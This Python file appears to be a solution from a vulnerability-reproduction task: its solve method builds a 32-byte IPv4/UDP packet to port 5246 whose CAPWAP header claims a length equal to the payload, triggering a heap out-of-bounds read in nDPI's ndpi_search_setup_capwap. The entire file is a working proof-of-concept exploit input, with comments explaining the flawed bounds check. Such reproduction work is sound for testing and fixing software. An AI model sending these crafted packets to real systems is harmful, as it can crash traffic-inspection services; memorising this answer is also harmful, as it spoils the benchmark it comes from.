import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        
        The vulnerability exists because the code calculates the CAPWAP header length
        based on the packet content and compares it to the packet length.
        In vulnerable versions, if payload_len == header_len, it proceeds to access
        data at the offset 'header_len', which is out of bounds (read).
        
        We construct a minimal IPv4 UDP packet (32 bytes) with a 4-byte CAPWAP payload
        that declares a 4-byte header length, satisfying the condition and triggering the OOB read.
        """
        
        # --- IPv4 Header (20 bytes) ---
        ip_ver_ihl = 0x45      # Version 4, IHL 5
        ip_tos = 0x00
        ip_total_len = 32      # 20 (IP) + 8 (UDP) + 4 (Payload)
        ip_id = 0x0001
        ip_frag_off = 0x0000
        ip_ttl = 64
        ip_proto = 17          # UDP
        ip_src = 0x7F000001    # 127.0.0.1
        ip_dst = 0x7F000001    # 127.0.0.1
        
        # Calculate IP Header Checksum
        # Sum 16-bit words
        words = [
            (ip_ver_ihl << 8) + ip_tos,
            ip_total_len,
            ip_id,
            ip_frag_off,
            (ip_ttl << 8) + ip_proto,
            0x0000, # Checksum placeholder
            (ip_src >> 16) & 0xFFFF,
            ip_src & 0xFFFF,
            (ip_dst >> 16) & 0xFFFF,
            ip_dst & 0xFFFF
        ]
        
        checksum = sum(words)
        # Fold carry bits
        while (checksum >> 16):
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        ip_check = ~checksum & 0xFFFF
        
        ip_header = struct.pack('!BBHHHBBHII', 
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
            
        # --- UDP Header (8 bytes) ---
        # Destination Port 5246 is CAPWAP Control
        udp_src = 0x1234
        udp_dst = 5246
        udp_len = 12           # 8 header + 4 payload
        udp_check = 0x0000     # No checksum
        
        udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
        
        # --- CAPWAP Payload (4 bytes) ---
        # Byte 0: 0x00 (Preamble, must be 0)
        # Byte 1: 0x08. HLEN is top 5 bits. (0x08 >> 3) = 1.
        #         Header Length = HLEN * 4 = 4 bytes.
        # Bytes 2-3: Padding/Reserved.
        #
        # Total Packet Payload Length = 4 bytes.
        # Calculated Header Length = 4 bytes.
        # Vulnerable check: if (packet_len >= header_len) { ... access payload[header_len] ... }
        # 4 >= 4 is True. Accesses index 4, which is OOB (indices 0-3 valid).
        payload = b'\x00\x08\x00\x00'
        
        return ip_header + udp_header + payload